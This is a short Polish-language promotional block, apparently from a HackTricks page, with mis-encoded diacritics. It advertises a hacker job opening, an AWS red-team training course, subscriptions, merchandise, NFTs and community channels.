Je≈õli interesuje Ciƒô **kariera hakera** i chcesz zhakowaƒá to, co nie do zhakowania - **zatrudniamy!** (_wymagane bieg≈Çe pos≈Çugiwanie siƒô jƒôzykiem polskim, zar√≥wno w mowie, jak i w pi≈õmie_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **na GitHubie.**

</details>
